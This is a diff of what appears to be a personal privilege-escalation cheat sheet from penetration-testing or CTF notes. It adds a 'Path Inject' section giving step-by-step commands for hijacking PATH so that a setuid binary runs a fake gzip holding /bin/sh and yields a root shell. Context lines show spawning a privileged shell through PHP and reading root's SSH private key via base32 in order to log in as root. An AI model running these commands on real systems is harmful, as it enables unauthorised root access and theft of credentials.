@@ -56,6 +56,22 @@ php7.2 -r "pcntl exec('/bin/sh', ['-p']);"
 /usr/bin/base32 /root/.ssh/id_rsa | /usr/bin/base32 --decode 
 vim id_rsa; chmod 600 id_rsa; ssh root@192.168.200.5 -i id_rsa 
 
+=================================== 
+Path Inject
+
+Sudo/App/Call that doesnt use full-path
+gzip -c /var/log/xyz
+strings /usr/bin/menu
+ltrace /bin/sysinfo
+
+cd /tmp 
+echo /bin/sh > gzip
+chmod 777 gzip
+echo $PATH 
+export PATH=/tmp:$PATH
+/usr/bin/menu
+whoami
+root
 
 =================================== 
 alias ll='ls -lsaht --color=auto'
